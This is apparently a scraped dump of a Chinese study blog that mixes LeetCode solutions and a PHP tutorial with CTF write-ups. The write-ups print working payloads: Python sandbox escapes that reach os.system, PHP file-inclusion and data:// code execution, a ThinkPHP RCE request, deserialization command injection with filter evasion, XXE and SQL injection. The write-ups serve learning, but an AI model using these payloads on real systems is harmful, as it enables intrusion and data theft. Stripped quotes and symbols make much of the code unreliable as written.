__builtins__.__dict__[__import__](os).system(ls)__builtins__.__dict__[__imp+ort__](os).system(ls) __builtins__是Python内置模块，包含所有内置函数和异常 __dict__是模块的属性字典 [__import__]获取内置的__import__函数（等同于import语句背后的实际函数） (os)动态导入os模块 .system(ls)调用os模块的system方法 . 符号被过滤不能使用句号 . 获取模块的函数（此时如果不能获取到 os 模块，可以使用 open 函数打开系统文件 使用 getattr 调用 模块、类、实例的方法 # str.join(list(open(flag.txt)))getattr(str(),join)(list(open(flag.txt)) # 后面的文件名可以用 chr() 拼接获得# chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116) _ 被过滤这三个特殊符号被过滤，可以利用 chr() 返回字符串的特性，与其他字符拼接成关键字 __builtins__ 的下划线在代码中也必须写成字符串的形式才能利用 chr() 进行转换。 可以使用 globals().get(__builtins__)获取 def chall(): user_input = input(Give me your code: ) # 过滤关键字 forbidden_keywords = [import, eval, exec, open, file] for keyword in forbidden_keywords: if keyword in user_input: print(fForbidden keyword detected: keyword) return # 过滤特殊字符 forbidden_chars = [., _, [, ], , ] for char in forbidden_chars: if char in user_input: print(fForbidden character detected: char) return result = eval(user_input) 利用 chr() 函数返回字符串，绕过 、、_ 过滤 利用getattr 绕过 . print(str.join(list(open(/tmp/flag.txt)))) print(getattr(str(),join)(list(open(/tmp/flag.txt)))) print(getattr(str(),join)(list(getattr(__builtins__,open)(/tmp/flag.txt)))) 此时 __builtins__ 仍然是模块名，而不是一个字符串，接着把它变成字符串形式 print(getattr(str(),join)(list(getattr(globals().get(__builtins__), open)(/tmp/flag.txt)))) print(getattr(str(),join)(list(getattr(getattr(globals(),get(__builtins__)), open)(/tmp/flag.txt)))) 最终： print(getattr(str(),chr(106)+chr(111)+chr(105)+chr(110))(list(getattr(getattr(globals(),chr(103)+chr(101)+chr(116))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)),(chr(111)+chr(112))+chr(101)+chr(110))(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))))) 运行时沙箱层__buildins__ 被禁用Python 的对象系统允许通过 原型链（__class__、__base__、__subclasses__） 间接访问被禁用的模块或函数。 即使禁用了 __builtins__，仍可以通过以下方式绕过限制： ().__class__.__base__.__subclasses__()[155].__init__.__globals__[system](ls) ()创建一个空元组。 ().__class__获取元组的类（class tuple）。 ().__class__.__base__获取父类（class object）。 ().__class__.__base__.__subclasses__()获取所有子类列表，其中可能包含危险类（如 os._wrap_close）。 __init__.__globals__ 字典包含对 os 模块的引用 这里的索引是 155，但是不同操作系统、不同Python版本、不同Python实现、其他库的安装 都可能影响os._wrap_close的位置。 l = ().__class__.__base__.__subclasses__()for i in range(len(l)): if os._wrap_close in str(l[i]): print(i) 输出155","categories":["CTF"]},{"title":"PHP","path":"//PHP/","content":"PHP学习 PHPPHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。 sudo apt install php# 安装一些常用扩展sudo apt install php-cli php-common php-mysql php-zip php-gd php-mbstring php-curl php-xml php-bcmath ?php// 1. 基础语法结构echo Hello, PHP World! ; // echo 打印, 和 shell 一样// 2. 变量和数据类型$name = Alice; // 变量以$开头，松散类型$age = 25;$height = 1.68;$isStudent = true;$languages = [PHP, Python, JavaScript]; // 数组// 3. 控制结构 - 和其他C风格语言类似if ($age = 18) echo $name 是成年人 ; else echo $name 是未成年人 ;// 4. 循环for ($i = 0; $i 3; $i++) echo 循环计数: $i ;foreach ($languages as $lang) echo 会编程语言: $lang ;// 5. 函数function greet($name, $time = 白天) // 默认参数 return 你好 $name，现在是$time ;echo greet($name);echo greet($name, 晚上);// 6. 类与对象class Person // 属性 public $name; private $age; // 私有属性 // 构造方法 public function __construct($name, $age) $this-name = $name; $this-age = $age; // 方法 public function introduce() return 我是$this-name，今年$this-age岁 ; // 静态方法 public static function species() return 人类 ; $person = new Person(Bob, 30);echo $person-introduce();echo Person::species(); // 调用静态方法// 7. 关联数组（类似JS对象或Python字典）$user = [ username = php_dev, email = dev@example.com, age = 28];echo 用户名: . $user[username] . ;// 8. 字符串操作$str = PHP编程;echo 字符串长度: . strlen($str) . ; // 注意中文是3字节echo 字符数: . mb_strlen($str, UTF-8) . ; // 正确处理中文// 9. 文件操作$file = test.txt;file_put_contents($file, 这是写入的文件内容 ); // 写入文件echo 文件内容: . file_get_contents($file);// 10. 错误处理try $result = 10 / 0; catch (DivisionByZeroError $e) echo 捕获到错误: . $e-getMessage() . ;// 11. 超全局变量示例echo 当前脚本: . $_SERVER[PHP_SELF] . ;// 12. 数据库连接示例 (MySQLi)/*$conn = new mysqli(localhost, username, password, database);if ($conn-connect_error) die(连接失败: . $conn-connect_error);$result = $conn-query(SELECT * FROM users);while ($row = $result-fetch_assoc()) print_r($row);$conn-close();*/?","categories":["Language"]},{"title":"LeetCode 第二部分","path":"//LeetCode-2/","content":"LeetCode 第二部分","categories":["LeetCode"]},{"title":"XCTF Web 题解二","path":"//XCTF Web-2/","content":"XCTF Web 题解二 1.Web_php_include?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? php://input是 PHP 中的一个流包装器（stream wrapper），它允许读取原始的 POST 数据。 data:// 伪协议：php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码 ​\tdata://text/plain;base64,xxxx(base64编码后的数据) 解决方法一使用 php://input，使用 POST 方法，传入恶意代码 ?php system(ls)? 接下来同样的方法查看 fl4gisisish3r3.php cat fl4gisisish3r3.php 解决方法二使用 data:// 伪协议执行代码 ?php system(dir)? page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKSA/Pg== 同样执行查看命令 ?php system(cat fl4gisisish3r3.php) ? page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIikgPz4= php_rce PHP RCE 指的是通过远程代码执行漏洞（Remote Code Execution）来攻击 PHP 程序的一种方式。简单来说，由于PHP应用程序没有正确处理外部输入数据（如用户提交的表单、请求参数等），攻击者通过某些手段向 PHP 应用程序中注入恶意代码，然后通过这些恶意代码实现对受攻击服务器的控制。 可以查询到 SkyBlueEternalthinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合 使用： /?s=index/\\think\\app/invokefunctionfunction=call_user_func_arrayvars[0]=systemvars[1][]=ls 执行成功，说明命令运行成功 find / -name flag cat /flag warmup 注意到 source.php ，访问看看","categories":["XCTF"]},{"title":"XCTF Web 题解一","path":"//XCTF Web-1/","content":"XCTF Web 题解一 1.unseping?phphighlight_file(__FILE__);class ease private $method; private $args; function __construct($method, $args) $this-method = $method; $this-args = $args; function __destruct() if (in_array($this-method, array(ping))) call_user_func_array(array($this, $this-method), $this-args); function ping($ip) exec($ip, $result); var_dump($result); function waf($str) if (!preg_match_all(/(\\|||;| |\\/|cat|flag|tac|php|ls)/, $str, $pat_array)) return $str; else echo dont hack; function __wakeup() foreach($this-args as $k = $v) $this-args[$k] = $this-waf($v); $ctf=@$_POST[ctf];@unserialize(base64_decode($ctf));? 分析这是一个PHP网站，从用户提交数据到完整响应的过程： 用户发送一个 HTTP POST 请求到该 PHP 页面，请求包含一个 ctf 参数。这个参数值会经过 base64 解码并还原成 PHP 的数据结构。 unserialize()是PHP的一个内置函数，作用是：将序列化后的字符串还原为PHP的数据结构（比如对象、数组等）。 与之对应的函数是 serialize()，它用于把PHP的数据结构（如对象、数组）转换成一个字符串表示，便于存储或传输。 当 unserialize() 被还原成对象时，由于类定义了 __wakeup() 魔术方法，会自动被调用。 unserialize() 在调用前会检查是否存在一个 __wakeup方法。如果存在，则会先调用 __wakeup 方法，预先准备对象数据。__wakeup 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 function __wakeup() foreach($this-args as $k = $v) $this-args[$k] = $this-waf($v); 遍历 $args ，对每个参数调用 waf 进行过滤。现在假设绕过了这个 WAF。 然后__destruct() 被自动调用，if 条件检查 method 是否为 ping function __destruct() if (in_array($this-method, array(ping))) call_user_func_array(array($this, $this-method), $this-args); PHP 中的一个内置函数，用于以数组的形式传递参数来调用回调函数（callable） $callback：要调用的回调函数，可以是一个函数名（字符串）、类方法（数组形式，如 [$object, method]或 [ClassName, method]），或者是匿名函数（闭包）等。 $param_arr：一个索引数组，包含要传递给回调函数的参数，这些参数会按照数组中的顺序传递给函数。 调用 $this-ping($this-args[0]) ping() 方法中，使用 exec 执行 $ip ，返回结果并放入 $result 数组，然后调用 var_dump 数组显示 function ping($ip) exec($ip, $result); var_dump($result); WAF 过滤： preg_match_all() 返回的是匹配到的数量 正则表达式分析： /(\\|||;| |\\/|cat|flag|tac|php|ls)/ /(........)/，使用 | 表示或 匹配项 含义 为什么危险 | 竖线符号（管道符） 用于 shell 命令管道，比如 ls | grep flag，可组合多个命令 符号 用于后台执行或命令分隔，比如 command1 command2 ; 分号 用于分隔多个命令，比如 command1; command2，前一个执行完执行下一个 空格 命令参数之间的分隔符，比如 cat flag中的空格。如果没有空格，很多命令就无法正确解析参数 \\/ 斜杠 / 通常用于路径，比如 /bin/sh、/flag，攻击者常用路径访问敏感文件 cat 关键字 Linux 命令，用于查看文件内容，比如 cat flag，是最常用的读取文件方式之一 flag 关键字 通常表示题目中的 “flag” 文件，比如 flag.txt或 flag，是攻击者的目标 tac 关键字 Linux 命令，是 cat的反向查看命令（倒序输出文件内容），也可以用来读取 flag php 关键字 表示 PHP 命令或脚本执行，比如 php -r ...，可能被用于执行恶意 PHP 代码 ls 关键字 Linux 命令，列出目录内容，攻击者常用来探测环境 也就是不允许 | ; 空格 / cat flag tac php ls ， 一些Bash的知识命令替换：在bash中，$() 与 反引号 都是用来作命令替换的，执行括号或者反引号中的命令。 命令替换与变量替换差不多，先完成引号里的命令行，然后将其执行结果作为替换，再重组成新的命令行进行执行。 绕过空格：Linux的bash shell中有一个叫做内部字段分隔符IFS（internal field separator）的变量，该变量常用于在处理文本数据时作为分隔符使用。 printf绕过（字符串进制绕过） printf 的格式化输出，可以将十六进制或者八进制的字符数字转化成其对应的ASCII字符内容输出。 \\N 3位八进制 对应 ASCII 字符 \\x 2位十六进制 对应 ASCII 字符\\u 4位十六进制 对应 Unicode 字符\\U 8位十六进制 对应 Unicode 字符 单引号双引号 单引号内容不会被 PHP 解析，在单引号字符串中，双引号是普通字符，不需要转义，也不会被PHP解析 利用这一特性，可以绕过 PHP 检查，并最终在 Bash 里解析出命令 外层使用双引号， PHP 会解析 $ $ $()等，导致可能无法通过检查，或者破坏最终执行的命令 解答首先 注入命令 ls $obj = new ease(ping,array(ls));echo base64_encode(serialize($obj)); 得到当前目录下只有 index.php 和 flag_1s_here ，那后一个目录中很可能就是 flag，继续查看后一个目录内容 $obj = new ease(ping,array(ls$IFSflag_1s_here)) ;echo base64_encode(serialize($obj)); 最后得到一个 flag.php 文件，查看这个文件 $obj = new ease(ping,array(cat$IFSflag_1s_here$(printf$IFS\\57)flag_831b69012c67b35f.php));echo base64_encode(serialize($obj)); ?phpclass ease private $method; private $args; function __construct($method, $args) $this-method = $method; $this-args = $args; // 创建对象# $obj = new ease(ping,array(ls));# $obj = new ease(ping,array(ls$IFSflag_1s_here)) ;$obj = new ease(ping,array(cat$IFSflag_1s_here$(printf$IFS\\57)flag_831b69012c67b35f.php));echo base64_encode(serialize($obj));? 2.robots Robots协议（也称为爬虫协议或机器人协议）是一种用于指导搜索引擎爬虫行为的约定。它通过在网站根目录下放置一个名为robots.txt的文本文件，告知爬虫哪些页面可以抓取，哪些页面应被禁止抓取，从而保护网站数据隐私、优化服务器性能并避免过度抓取。 3.disabled_button 删除这个 disable 属性即可 4.unserialize3 打开网站是一个不完全的 php 文件，括号都没闭合，但是下面又有个 ?code 这应该是在提示要传 code 参数，注意到这个__wakeup，那就应该传入一个序列化对象 ?phpclass xctf public $flag = 111; public function __wakeup() exit(bad requests); $obj = new xctf(); echo serialize($obj);? 但是这样还不够，因为__wakeup方法会exit退出，需要绕过这个函数。 __wakeup 只有当 unserialize反序列化成功时才会被调用，只要让他失败，即可 PHP 反序列化漏洞 特性 —— 当对象属性数量声明与实际不符时，__wakeup()不会被调用！ CVE-2016-7124 O:4:xctf:1:s:4:flag;s:3:111; 解析：对象名长度为 4 的对象 xctf，含有一个字符串 flag 属性，属性值是 111 序列化格式 String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;(repeated per element)} Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} 将属性数量修改为 2 再通过 ?/code = ...... 提交，即可获得 flag 5.PHP2 后缀名为.phps的文件出现在无法使用web浏览器查看php源代码的情况下，.phps文件就是对应文件的源代码！ PHP 的比较： ==：松散比较，会进行类型转换，只需保证值相等 ===：严格比较，类和值都必须相等 运算符 名称 描述 是否类型转换 ! 不等于 检查两个值是否不相等（会进行类型转换） 是（松散） 不等于（同 !） 功能与 !=完全一样 是（松散） ! 不全等 检查值或类型是否不全等（严格，不转换类型） 否（严格） 大于 左边是否大于右边 是（松散） 小于 左边是否小于右边 是（松散） 大于或等于 左边是否大于或等于右边 是（松散） 小于或等于 左边是否小于或等于右边 是（松散） 太空船操作符（PHP 7+） 比较两个表达式，返回 -1 0 1（见下文） 是（有规则） 一个操作数是数字，另一个是字符串，PHP 会尝试将 字符串转换为数字。 现在我们需要绕过第一个检查，并且通过第二个检查。 使用 URL 编码，编码一次，还是不能 编码两次，就能通过了 6.ics-06 注意到上方的 id，修改值返回同样页面，那可能需要爆破 使用 Burp 进行爆破，抓包，添加到 Intruder，然后将 id 值的位置添加神秘符号，最后设置待遍历类型为 Number，范围从 1 到 某个足够大的数，开始遍历。 在返回结果中找到不同的一个即可。 结果是 id2333 flag2333_bao_pO_OOOO0o_o0OOO 7.backupindex.php 的备份文件名： index.php.bakindex.php.swpindex.php~index.php.oldindex.php.backup 挨个试，结果是 index.php.bak 8.weak_auth一个登录网站，输入账户密码，提示账户是 admin，密码使用 Burp 进行弱口令爆破，得出密码是 123456 9.simple_php 输入的 a 需要 与 0 若比较相等，字符串 输入的 b 如果是数字 退出，但是若比较需要大于 1234 让a=a， a == 0 会将 a 转换为数字，但是会失败，所以为0，但是字符a不为空，能通过检查 让b=1235a，非纯数字通过检查，字符串类型，b1234检查会将b转换成数字类型，1235 ?a=ab=1235a 10.baby_web打开一个页面只有一串 Hello,World，提示说Web的初始页面是什么，应该是 index.html或index.php， 访问 index.php，发现页面被重定向到 刚刚的页面，使用 Burp 看看index.php 页面，显示 flag被藏起来了，查看十六进制发现flag。 11.inget提示输入id并绕过 ?id=1OR1=1 SQL 注入，就能绕过 12.fileclude 注意到最开始出现了个 WRONG WAY! 第二行，猜测是因为这个 include(“flag.php”) 导致的，看这个文件名，应该与 flag 有关 在 PHP 中，isset() 是一个非常常用的函数，用于检测变量是否已设置并且值不为 null。它返回一个布尔值：如果变量存在且值不是 null，则返回 true；否则返回 false。 一些协议知识data:// 伪协议： data://MIME类型[,数据]data://MIME类型;base64,Base64编码的数据 php://filter 伪协议： php://filter主要用于在读取文件时进行数据流过滤（如Base64编码、ROT13转换等）。它的常见用途是 读取PHP文件源码（因为直接 include或 file_get_contents会执行PHP代码，而过滤后可以获取原始内容）。 php://filter/过滤器/resource=文件路径php://filter/过滤器1|过滤器2/resource=文件路径 解题之前已经 include(flag.php)，但是没有显示，可能被执行过。于是选择对 glag.php 进行 base64 加密 file1=php://filter/convert.base64-encode/resource=flag.phpfile2=data://text/plain,hello ctf ?file1=php://filter/convert.base64-encode/resource=flag.phpfile2=data://text/plain,hello ctf 最终显示： PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gZmxhZ3sxbmx1ZGVfYW5kX2cwVF8xVCF9 base64 解码即可，解码结果： ?phpecho WRONG WAY!;// $flag = flag1nlude_and_g0T_1T! 13.file_include 查看 etcpasswd，没有被过滤 查看 check.php 没有回显，应该是被执行，使用 php://filter 协议看看能否获得 check.php filename=php://filter/convert.base64-encode/resource=check.php 结果显示 do not hack! ，这应该就是 check.php 发力了，现在需要通过 check.php 的检查， 除了 base64-encode，还有许多其他可用的过滤器可以用于类似的数据转换或“加密”目的。 编码转换过滤器 (convert.*) convert.base64-decodeconvert.quoted-printable-encodeconvert.quoted-printable-decodeconvert.iconv.* (这是一个强大的子类)\tconvert.iconv.UTF-8.UCS-2\tconvert.iconv.UTF-8.UTF-7\tconvert.iconv.UTF-8.ROT13 字符串过滤器 (string.*) string.toupper：将所有字符转换为大写。string.tolower：将所有字符转换为小写。string.rot13：执行 ROT13 转换（与 convert.iconv.UTF-8.ROT13效果类似）。 压缩过滤器 (zlib.*, bzip2.*) zlib.deflate：使用 DEFLATE 算法压缩数据。zlib.inflate：解压 DEFLATE 数据。bzip2.compress：使用 BZip2 算法压缩数据。bzip2.decompress：解压 BZip2 数据。 filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=check.php 将 UTF-7 字符串转码为 UTF-8 整理一下： ?php if($_GET[filename]) $preg_match_username = return preg_match(/base|be|encode|print|zlib|quoted|write|rot13|read|string/i, $_GET[filename]);; if (eval($preg_match_username)) die(do not hack!); 获得了 check.php 内容，但是仍然没有 flag，查看 flag.php，然后同样转码即可 filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php flag63d1133b-75a1-4ce5-b586-3dbe1698bd2a 14.fileinclude 这里 include 了从 Cookie 获取的 $lan 变量指向的文件 那现在只需要让 $lan=flag 即可，include 时会加上 .php Cookie: language=flag 页面没有回显，可能是因为被执行，使用 base64 和 php:filter 协议加密 flag.php 防止执行 Cookie: language=php://filter/convert.base64-encode/resource=flag 得到 base64 编码过的 flag.php 内容，解码获得 flag ?php$flag=flagd0f6e79a20fd11eb8cf4fa163e83cb88;?","categories":["XCTF"]},{"title":"CTF Web基础知识","path":"//CTF Web 基础知识/","content":"CTF Web基础知识 Robots协议Robots协议（也称为爬虫协议或机器人协议）是一种用于指导搜索引擎爬虫行为的约定。它通过在网站根目录下放置一个名为robots.txt的文本文件，告知爬虫哪些页面可以抓取，哪些页面应被禁止抓取，从而保护网站数据隐私、优化服务器性能并避免过度抓取。 php文件包含漏洞为了更好地使用代码的重用性，可以使用文件包含函数将文件包含进来，直接使用文件中的代码来提高重用性。 但是这也产生了文件包含漏洞，产生原因是在通过 PHP 的函数引入文件时，为了灵活包含文件会将被包含文件设置为变量，通过动态变量来引入需要包含的文件。此时用户可以对变量的值可控，而服务器端未对变量值进行合理地校验或者校验被绕过，就会导致文件包含漏洞。 文件包含函数 功能 函数 代码执行到 include() 函数时将文件包含 include() 当重复调用同一文件时只调用一次,功能与 include() 相同 include_once() require() 执行如果发生错误，函数会报错并终止脚本 require() 当重复调用同一文件时只调用一次,功能与 require() 相同 require_once() php特性PHP序列化与反序列化 PHP内置序列化函数 serialize()，用于把PHP的数据结构（如对象、数组）转换成一个字符串表示，便于存储或传输。 对应反序列化函数unserialize()，作用是：将序列化后的字符串还原为PHP的数据结构（比如对象、数组等）。 unserialize() 在调用前会检查是否存在一个 __wakeup方法。如果存在，则会先调用 __wakeup 方法，预先准备对象数据。 PHP 反序列化漏洞 特性 —— 当对象属性数量声明与实际不符时，__wakeup()不会被调用 CVE-2016-7124 O:4:xctf:1:s:4:flag;s:3:111;# Object : xctf (名字长度为4，含有一个属性)# flag:111 (属性名和值都是 String) 序列化格式 String : s:size:value; Integer : i:value; Boolean : b:value;(保存1或0) Null : N; Array : a:size:{key definition;value definition;(repeated per element)} Object : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} PHP比较 运算符 名称 描述 是否类型转换 等于 只需保证值相等 是（松散） 等于 类和值都必须相等 否（严格） ! 不等于 检查两个值是否不相等（会进行类型转换） 是（松散） 不等于（同 !） 功能与 !=完全一样 是（松散） ! 不全等 检查值或类型是否不全等（严格，不转换类型） 否（严格） 大于 左边是否大于右边 是（松散） 小于 左边是否小于右边 是（松散） 大于或等于 左边是否大于或等于右边 是（松散） 小于或等于 左边是否小于或等于右边 是（松散） 数字和字符串比较，PHP 会尝试将 字符串转换为数字。 1234c - 1234 php伪协议在 PHP 中， 伪协议（Pseudo Protocols） 也被称为 流包装器 ，这些伪协议以 php:// 开头，后面跟着一些参数，用于指定 要执行的操作 或 需要访问 伪协议表明这些协议并不是一个 真实的外部协议 ，例如 http 或 ftp 。 PHP 伪协议的出现是为了提供一个 统一的 、 简洁的 接口来处理 不同的数据流 伪协议可以被看作是一种桥梁 ，它们允许开发者 使用常规的文件操作函数来处理各种不同的数据流 。 几个 PHP 支持的伪协议如下： 伪协议 功能 file: 访问本地文件系统 http: 访问 HTTP(s) 网址 php: 访问各个输入输出流 phar: PHP 归档 zip: 压缩流 php:filterphp://filter 伪协议： php://filter主要用于在读取文件时进行数据流过滤（如Base64编码、ROT13转换等）。它的常见用途是 读取PHP文件源码（因为直接 include或 file_get_contents会执行PHP代码，而过滤后可以获取原始内容）。 php://filter/过滤器/resource=文件路径php://filter/过滤器1|过滤器2/resource=文件路径 一些过滤器： 编码转换过滤器 (convert.*) convert.base64-encodeconvert.base64-decodeconvert.quoted-printable-encodeconvert.quoted-printable-decodeconvert.iconv.* (这是一个强大的子类)\tconvert.iconv.UTF-8.UCS-2\tconvert.iconv.UTF-8.UTF-7\tconvert.iconv.UTF-8.ROT13 字符串过滤器 (string.*) string.toupper：将所有字符转换为大写。string.tolower：将所有字符转换为小写。string.rot13：执行 ROT13 转换（与 convert.iconv.UTF-8.ROT13效果类似）。 压缩过滤器 (zlib.*, bzip2.*) zlib.deflate：使用 DEFLATE 算法压缩数据。zlib.inflate：解压 DEFLATE 数据。bzip2.compress：使用 BZip2 算法压缩数据。bzip2.decompress：解压 BZip2 数据。 php:inputphp://input 伪协议允许读取原始的 POST 数据 ?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? 虽然过滤了 php:// 伪协议，但是可以大写绕过。发送 POST 请求，参数page = PHP://input 请求体：?php system(ls)? 这样 page 实际上等于 ?php system(ls)? php://input不是在 GET 参数传递时就解析，而是在 实际使用（includerequirefile_get_contents等）时 才会动态读取当前请求的原始 POST 数据。 data: 伪协议php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为: data://text/plain;base64,xxxx(base64编码后的数据) XMLXML（eXtensible Markup Language）是一种标记语言，用于存储和传输结构化数据。它与 HTML 类似，但 XML 没有预定义标签，你可以自定义标签来满足需求。 一般实体的声明：!ENTITY 实体名称 实体内容引用一般实体的方法：实体名称; XXE（XML外部实体注入）XXE全称XML外部实体注入，利用外部实体将flag所在文件赋值给一个实体，并且引用实体，得到想要的数据。 Payload ?xml version=1.0 encoding=utf-8?!DOCTYPE a [!ENTITY file SYSTEM file:///d://qwzf.txt]!--定义外部实例file--xmlxxefile;/xxe/xml!--引用外部实例-- file:///d://qwzf.txt是一种使用 URI（统一资源标识符） 格式引用本地文件的方式。 CSRF 跨站请求伪造Cross-Site Request forgrey","categories":["CTF"]},{"title":"LeetCode 第一部分","path":"//LeetCode-1/","content":"LeetCode 1.两数之和给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target 的那 两个 整数，并返回它们的数组下标。 你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。 你可以按任意顺序返回答案。 解法一两层 for 循环遍历，时间复杂度 $ O(N^{2})$ class Solution public: vectorint twoSum(vectorint nums, int target) int length = nums.size(); for(int i = 0; i length; i++) for(int j = 0; j length; j++) if(nums[i] + nums[j] == target i != j) vectorint result = i,j; return result; return ; ; 解法二 哈希表存储键值对，使用键即可索引值 使用哈希表，使用值索引，存储下标。 从前往后遍历，若使用 target - nums[i] 哈希到的位置为空，向表中插入 nums[i] : i 若哈希到的位置不为空，说明当前的 target - nums[i] 等于之前插入的某个 [j]，这两个 i、j 即为找的两个数 class Solution public: vectorint twoSum(vectorint nums, int target) unordered_mapint, int hashtable; for (int i = 0; i nums.size(); ++i) auto it = hashtable.find(target - nums[i]); if (it != hashtable.end()) return it-second, i; hashtable[nums[i]] = i; return ; ; 哈希表的查询、删除、插入 时间复杂度都为 $ O(1)$ ，总的时间复杂度为$ O(n) $ 2.两数相加给你两个 非空 的链表，表示两个非负的整数。它们每位数字都是按照 逆序 的方式存储的，并且每个节点只能存储 一位 数字。 请你将两个数相加，并以相同形式返回一个表示和的链表。 你可以假设除了数字 0 之外，这两个数都不会以 0 开头。 解法一/*struct ListNode int val; ListNode *next; ListNode() : val(0), next(nullptr) ListNode(int x) : val(x), next(nullptr) ListNode(int x, ListNode *next) : val(x), next(next) ;*/class Solution public: ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) ListNode* result = new ListNode; ListNode* p3 = result; ListNode* tmp = p3; int carry = 0; while(l1 != nullptr || l2 != nullptr) // 链表一 计算完毕 if(l1 == nullptr) if(l2-val + carry 9) p3-val = (l2-val + carry) % 10; carry = 1; else p3-val = l2-val + carry; carry = 0; l2 = l2-next; p3-next = new ListNode; tmp = p3; p3 = p3-next; //链表二 计算完毕 else if(l2 == nullptr) if(l1-val + carry 9) p3-val = (l1-val + carry) % 10; carry = 1; else p3-val = l1-val + carry; carry = 0; l1 = l1-next; p3-next = new ListNode; tmp = p3; p3 = p3-next; // 链表一、二都需计算 else if(l1-val + l2-val + carry 9) p3-val = (l1-val + l2-val + carry) % 10; carry = 1; else p3-val = l1-val + l2-val + carry; carry = 0; l1 = l1-next; l2 = l2-next; p3-next = new ListNode; tmp = p3; p3 = p3-next; //最后的 carry 为 1 需要加一位 if(carry == 1) p3-next = nullptr; p3-val = carry; else delete p3; tmp-next = nullptr; return result; ; 解法二上面的办法还是太麻烦了，主要麻烦在判断链表一、二是否计算完毕，不如将两个链表看作同一长度，空的位置认为是 0 class Solution public: ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) ListNode* head = new ListNode; ListNode* tail = head; int carry = 0; while(l1 != nullptr || l2 != nullptr) int value1 = (l1) ? l1-val : 0; int value2 = (l2) ? l2-val : 0; tail-next = new ListNode((value1 + value2 + carry) % 10); tail = tail-next; carry = (value1 + value2 + carry) / 10; l1 = (l1) ? l1-next : l1; l2 = (l2) ? l2-next : l2; if(carry == 1) tail-next = new ListNode(carry); return head-next; ; 3.无重复字符的最长子串给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。 解法一使用双端队列记录 当前子串 下一个字符不在队列中：入队 下一个字符在队列中：队列中该字符以及之前所有字符出队，新字符入队 记录整个过程中队列的最大长度即可 空间复杂度 $O(n)$，时间复杂度 $O(n^2)$ class Solution public: int lengthOfLongestSubstring(string s) int count = 0; int max = 0; dequechar d; for(int i = 0; i s.length(); i++) int index = 0; // 记录当前字符在队列中出现的位置，如果队列中没有 index == d.size() for(char cc : d) if(cc == s[i]) break; index++; // 如果出现，将 deque[0:index+1] 退出队列 if(index != d.size()) for(int i = index + 1; i 0; i--) d.pop_front(); // 当前字符入队 d.push_back(s[i]); count = d.size(); max = (count max) ? count : max; return max; ; 4.寻找两个正序数组的中位数给定两个大小分别为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。请你找出并返回这两个正序数组的 中位数 。 算法的时间复杂度应该为 O(log (m+n)) 。 解法一空间复杂度 $O(m+n)$，时间复杂度$O(m+n)$ 空间换时间，直接新建一个向量容器,按大小顺序排列。 class Solution public: double findMedianSortedArrays(vectorint nums1, vectorint nums2) int length = nums1.size() + nums2.size(); vectorint vec; int i = 0, j = 0; while( i + j length) if(i == nums1.size()) vec.push_back(nums2[j++]);continue; if(j == nums2.size()) vec.push_back(nums1[i++]);continue; if(nums1[i] nums2[j]) vec.push_back(nums1[i++]); else vec.push_back(nums2[j++]); return length % 2 ? vec[length / 2] : ((double)(vec[length / 2 - 1] + vec[length / 2])) / 2; ; 解法二空间复杂度 $ O(1) $，时间复杂度$O(m+n)$ class Solution public: double findMedianSortedArrays(vectorint nums1, vectorint nums2) int length = nums1.size() + nums2.size(); int i = 0, j = 0; // 总长度为奇数，中位数的下标 index = length/2 if(length % 2) while( i + j != length / 2) if(i == nums1.size()) j++; else if(j == nums2.size()) i++; else if(nums1[i] nums2[j]) i++; else j++; if(i == nums1.size()) return nums2[j]; else if(j == nums2.size()) return nums1[i]; else if(nums1[i] nums2[j]) return nums1[i]; else return nums2[j]; // 总长度为偶数，中位数下标为 length/2 - 1 和 length/2 的平均数 else while( i + j != length / 2 - 1) if(i == nums1.size()) j++; else if(j == nums2.size()) i++; else if(nums1[i] nums2[j]) i++; else j++; int num1; if(i == nums1.size()) num1 = nums2[j++]; else if(j == nums2.size()) num1 = nums1[i++]; else if(nums1[i] nums2[j]) num1 = nums1[i++]; else num1 = nums2[j++]; int num2; if(i == nums1.size()) num2 = nums2[j]; else if(j == nums2.size()) num2 = nums1[i]; else if(nums1[i] nums2[j]) num2 = nums1[i]; else num2 = nums2[j]; return (double)(num1 + num2) / 2; ;","categories":["LeetCode"]},{"title":"Cyber Security 101 第八部分 网络安全","path":"//Cyber-Security-101-8/","content":"Web 安全 基础知识Web 应用程序前端： HTML：Web 应用程序的基础。指示 Web 浏览器显示什么内容以及如何显示。 css（Cascading Style Sheets)：描述了标准的外观，例如特定的颜色、文本类型和布局。 Javascript： Web 应用前端的一部分，支持 Web 浏览器中更复杂的活动。 后端： 数据库：存储、修改、检索信息 基础设施：Web 服务器、应用服务器、存储、各种网络设备以及其他支持 Web 应用程序的软件。 